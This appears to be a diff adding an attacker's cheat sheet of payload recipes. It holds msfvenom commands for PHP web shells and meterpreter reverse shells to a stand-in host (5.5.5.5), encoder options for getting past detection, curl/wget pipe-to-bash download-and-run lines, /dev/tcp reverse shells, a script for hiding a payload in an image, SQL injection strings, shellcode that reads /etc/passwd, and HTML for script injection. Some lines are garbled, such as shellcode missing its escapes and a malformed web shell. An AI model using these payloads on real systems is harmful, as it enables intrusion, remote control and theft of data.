@@ -1,0 +1,116 @@
+#--[ Generate CMD LINUX GZIP file and inject it into photo or zip or php ]--#
+
+sudo msfvenom -p linux/x86/exec cmd="';\)' or '1='1--+-" -f raw -o p2.php
+sudo msfvenom -p linux/x86/exec cmd="<?= echo shell_exec($_GET['cmd']);echo passthru($_GET['cmd']);?>" -f raw -o p.php
+sudo msfvenom -p linux/x64/exec cmd="nc -v -n 5.5.5.5 9001" -f raw -o p.php
+sudo msfvenom -p linux/x64/exec cmd="nc -v -n 5.5.5.5 9001" -f vbapplication
+sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=5.5.5.5 LPORT=9001 CMD="/bin/bash" -f js_le -e generic/none -o attacking.js
+
+!--( ENCODE PHP FROM DETECTED .. bypass )--!
+msfvenom -p php/meterpreter_reverse_tcp LHOST=5.5.5.5 LPORT=9001 -f raw -e x64/xor_context -i 9 -o perl3.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=5.5.5.5 LPORT=9001 -e x86/bloxor -o perl6.php
+
+
+cat p.php | sha512sum
+cat p.php | sha256sum
+cat p.php | base64 -i
+cat p.php | md5sum
+
+#ATTACKeR URL: 5.5.5.5
+http://5.5.5.5/evil/attacking.js
+
+!--( RUN ATTACKeR URL ON TARGEET  )--!
+curl -s -L http://5.5.5.5/evil/p4511.sh | bash
+bash <(curl -s http://5.5.5.5/evil/p4511.sh)
+bash <(wget -qO- http://5.5.5.5/evil/p4511.sh)
+wget -O - http://5.5.5.5/evil/p4511.sh | bash
+0<&89-;exec 89<>/dev/tcp/5.5.5.5/9001;sh <&89 >&89 2>&89
+0<&89-;exec 89<>/dev/tcp/5.5.5.5/9001;sh <&89 >&89 2>&89
+
+!--( INJECT IMAGE USING MSFVENOM )--!
+msfvenom -p php/meterpreter_reverse_tcp LHOST=5.5.5.5 LPORT=4511 -f raw -o payload.php
+./png.pl -payload "$(cat payload.php)" -output payload.png
+
+cat /etc/passwd : SLgvYmluL3NoAJlQVF9SZmgtY1ReUugQAAAAY2F0IC9ldGMvcGFzc3dkAFZXVF5qO1gPBQ==
+ls -la : SLgvYmluL3NoAJlQVF9SZmgtY1ReUugHAAAAbHMgLWxhAFZXVF5qO1gPBQ==
+
+
+
+
+
+#--[ from shell_exec get cmd: in url : index.php?cmd=ls ]--#
+#[ <?php shell_exec($_GET['cmd'];?> ]
+
+MD5	:	0798a43a883188f4c1d1d03e94c7de79
+sha256	:	b88cce18975b937be9fc751380346d6fd4ce5d07daf463fae29ae4206840da11
+sha512	:	4ab8bdef084d14f31537a35db6b018f6eacbfb3b36e399895f8a817a98ffe22c7a07ad36f4c367f778610089e6f67b993bec404ad1f326a55dc664394f0bea5c
+base64	:	agtY77+9UmZoLWPvv73vv71oL3NoAGgvYmlu77+977+9Uu+/vTcAAABUNFQzNE06QmxhY0tIYXQ6SGFja2VyPD89IGVjaG8gc2hlbGxfZXhlYyhbJ2NtZCddKTtlY2hvIHBhc3N0aHJ1KFsnY21kJ10pOz8+AFdT77+977+9zYA=
+----!
+
+#--[ CMD TO GZIP TO MD5+BASE65 ]--#
+#[ ' or '1='1'--+- ]
+
+MD5	:	8c664806a122bd2f47f427b13bcc2e6c
+sha256	:	f30cbb71260a4e10bead16c2ee412b57c973f0b52fd672e09e81fbc29e97a1a7
+sha512	:	ec9451d62a25642e0a8ba18399cd3bf63f1a0a18862f64a881067396415d26c9f86a2a67b60d4373dfdc81b687134d5abe8c7f4b51ea1be1ac228ebedb20bb0a
+base64	:	agtYmVJmaC1jiedoL3NoAGgvYmluieNS6BIAAAAnOyknIG9yICcxPScxLS0rLQBXU4nhzYA=
+
+
+
+
+#--[ Payload: linux/x64/exec - CMD: ls -la ]--#
+#[ sudo msfvenom -p linux/x64/exec cmd="ls -la" -f bash]#
+
+"x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f";
+"x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x07\x00\x00\x00\x6c";
+"x73\x20\x2d\x6c\x61\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f";
+"x05";
+
+
+#--[ Payload: linux/x64/exec - CMD: cat /etc/passwd ]--#
+#[ sudo msfvenom -p linux/x64/exec cmd="cat /etc/passwd" -f bash ]#
+
+"x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f";
+"x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x10\x00\x00\x00\x63";
+"x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
+"x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
+
+
+
+#--[ Payload: linux/x86/exec - CMD: <?= echo shell_exec($_GET['cmd']);echo passthru($_GET['cmd']);?> ]--#
+#[ sudo msfvenom -p linux/x86/exec cmd="<?= echo shell_exec($_GET['cmd']);echo passthru($_GET['cmd']);?>" -f c ]#
+
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x37\x00\x00\x00\x3c"
+"\x3f\x3d\x20\x65\x63\x68\x6f\x20\x73\x68\x65\x6c\x6c\x5f\x65"
+"\x78\x65\x63\x28\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x65\x63"
+"\x68\x6f\x20\x70\x61\x73\x73\x74\x68\x72\x75\x28\x5b\x27\x63"
+"\x6d\x64\x27\x5d\x29\x3b\x3f\x3e\x00\x57\x53\x89\xe1\xcd\x80";
+
+
+
+#----------------
+
+INJECT xxx.js in HTML
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+  </head>
+  <body>
+    <script src="xxx.js"></script>
+  </body>
+</html>
+
+
+#----------------
+
+<script src="xxx.js"> var color = 'blue'; var background = 'yellow'; var width = 400; </script>
+
+#----------------
+
+<script type="text/javascript" src="xxx.js"></script>
+
